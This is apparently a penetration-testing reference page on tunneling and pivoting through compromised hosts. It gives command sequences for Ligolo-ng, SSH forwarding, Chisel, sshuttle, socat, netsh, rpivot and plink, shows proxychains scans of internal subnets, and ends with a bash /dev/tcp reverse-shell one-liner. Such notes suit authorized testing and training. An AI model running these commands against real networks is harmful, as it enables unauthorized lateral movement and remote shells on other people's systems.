---
title: "Tunneling"
---

# Tunneling

Tunneling enables traffic routing through compromised hosts to reach otherwise inaccessible network segments. This is essential in multi-layered environments where the target is not directly reachable from the attack machine.

## Ligolo-ng (Primary Tool)

Ligolo-ng creates a TUN interface on Kali that transparently routes traffic into the internal network through a compromised host. No SOCKS proxy needed — tools run natively without proxychains.

### Setup

```bash
# Kali — create TUN interface and start the proxy
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
~/exp/tools/lig_proxy-linux64 -selfcert

# Target Linux host — connect to proxy
~/exp/tools/lig_agent-linux64 -connect 192.168.100.2:11601 -ignore-cert

# Target Windows host
ligolo_agent.exe -connect 192.168.100.2:11601 -ignore-cert
```

### Tunnel Operation

```bash
# In Ligolo console — select session and check internal network
session
1
ifconfig

# Kali — add route to internal network
sudo ip route add 192.168.1.0/24 dev ligolo

# Ligolo — start the tunnel
start --tun ligolo
```

Now all traffic to 192.168.1.0/24 routes through the compromised host transparently. Normal tools work without proxychains.

### Multiple Pivots

For pivoting from an internal host to a deeper network:

```bash
# Add listener on agent (for agent-to-agent relay)
# In Ligolo console:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# On second pivot host, connect to first pivot's listener
lig_agent-linux64 -connect 192.168.1.x:11601 -ignore-cert

# Add route for deeper network
sudo ip tuntap add user kali mode tun ligolo2
sudo ip link set ligolo2 up
sudo ip route add 10.10.10.0/24 dev ligolo2

# In Ligolo console, select new session and start with ligolo2 interface
session
2
start --tun ligolo2
```

### Port Forwarding with Ligolo

For services that need to reach back to Kali from internal hosts:

```bash
# Ligolo listener — forward internal host traffic to Kali
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# Now internal hosts can connect to pivot_host:4444 and reach Kali:4444
# Useful for reverse shells from deep internal hosts
```

## SSH Tunneling

### Local Port Forwarding

Access a service on the remote host or beyond from Kali:

```bash
# Access target's internal MySQL (only listening on localhost)
ssh -L 3306:127.0.0.1:3306 user@<target>

# Access internal network host through jump server
ssh -L 8080:192.168.1.100:80 user@<jump_server>

# Then access locally:
curl http://127.0.0.1:8080
mysql -h 127.0.0.1 -P 3306
```

### Remote Port Forwarding

Expose Kali port through target to an internal network:

```bash
# From target — forward Kali:4444 to target:4444 (for reverse shells from internal hosts)
ssh -R 4444:127.0.0.1:4444 kali@KALI_IP

# Non-interactive (from within a script)
ssh -R 4444:127.0.0.1:4444 -N -f kali@KALI_IP
```

### Dynamic SOCKS Proxy

Creates a SOCKS5 proxy through SSH for routing all traffic:

```bash
# Start SOCKS proxy
ssh -D 9050 user@<target>
ssh -D 9050 -N -f user@<target>

# Configure proxychains
cat /etc/proxychains4.conf
# Add at the end: socks5 127.0.0.1 9050

# Use with proxychains
proxychains nmap -sT -Pn 192.168.1.100
proxychains curl http://192.168.1.100
proxychains python3 exploit.py 192.168.1.100
```

### ProxyJump (Multi-hop SSH)

```bash
# SSH through jump host to final target
ssh -J user@jump_host user@internal_host

# Three hops
ssh -J user1@host1,user2@host2 user@internal_host

# In ~/.ssh/config:
Host internal
    HostName 10.10.10.50
    User user
    ProxyJump jump_user@192.168.1.1
```

## Chisel

When SSH is not available — TCP tunnel over HTTP(S):

```bash
# Server (Kali)
./chisel server -p 8080 --reverse

# Client (target — reverse SOCKS proxy)
./chisel client KALI:8080 R:socks

# Now use proxychains with socks5 127.0.0.1:1080
# Or specific port forward:
./chisel client KALI:8080 R:4444:127.0.0.1:4444

# Forward mode (client to server)
# Client: ./chisel client KALI:8080 3306:127.0.0.1:3306
```

## sshuttle

Transparent proxy over SSH — routes entire subnet without proxychains:

```bash
# Route entire internal network through SSH
sshuttle -r user@<target> 192.168.1.0/24

# Exclude the gateway itself
sshuttle -r user@<target> 192.168.1.0/24 --exclude <target_IP>

# With SSH key
sshuttle -r user@<target> 192.168.1.0/24 -e 'ssh -i id_rsa'

# Multiple subnets
sshuttle -r user@<target> 192.168.1.0/24 10.10.0.0/16
```

## Socat

Port forwarding and relay without SSH:

```bash
# TCP port forward
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# Bi-directional relay (pivot host — forward Kali:4444 to internal_host:4444)
socat TCP-LISTEN:4444,fork TCP:10.10.10.50:4444

# Background
nohup socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80 &

# UDP forward
socat UDP-LISTEN:53,fork UDP:8.8.8.8:53
```

## Netsh (Windows Port Forwarding)

On a compromised Windows host:

```shell
# Forward 0.0.0.0:8080 to internal_host:80
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.100

# List all forwards
netsh interface portproxy show all

# Remove
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

## rpivot

Python-based SOCKS proxy — useful when only Python is available:

```bash
# Server (Kali)
python3 server.py --proxy-port 9050 --server-port 9999 --server-ip KALI

# Client (target)
python3 client.py --server-ip KALI --server-port 9999

# Use with proxychains (socks4 127.0.0.1 9050)
```

## Plink (Windows SSH Client)

```shell
# Reverse SOCKS proxy from Windows target to Kali
plink.exe -ssh -pw "password" user@KALI -R 9050
plink.exe -ssh -N -R 9050 user@KALI

# Local forward
plink.exe -ssh -L 3389:192.168.1.100:3389 user@KALI
```

## Proxychains Configuration

```bash
cat /etc/proxychains4.conf

# Dynamic chaining — skips dead proxies
dynamic_chain

# Proxy list (at end of file)
socks5  127.0.0.1 9050
socks4  127.0.0.1 9050
http    127.0.0.1 8080

# Usage
proxychains nmap -sT -Pn -p 22,80,445,3389 192.168.1.0/24
proxychains crackmapexec smb 192.168.1.0/24
proxychains python3 exploit.py <internal_IP>
```

## Common Scenarios

### Pivot through Linux host

```bash
# 1. Get shell on pivot host (192.168.100.10)
# 2. Start Ligolo proxy, connect agent
# 3. Add route to internal network
sudo ip route add 10.10.10.0/24 dev ligolo
# 4. Scan internal network directly
sudo nmap -sCV -p- --min-rate=10000 -Pn 10.10.10.50
```

### Pivot through Windows host

```shell
# Option 1: plink
plink.exe -ssh -N -D 9050 user@KALI

# Option 2: Ligolo agent
ligolo_agent.exe -connect KALI:11601 -ignore-cert

# Option 3: netsh port forward for specific service
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.50
```

### Reverse Shell through Pivot

```bash
# When internal host can't reach Kali directly:

# 1. Add Ligolo listener on pivot
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# 2. On internal host, reverse shell to pivot IP:4444
bash -i >& /dev/tcp/192.168.100.10/4444 0>&1

# 3. Shell arrives on Kali netcat listener
nc -lvnp 4444
```
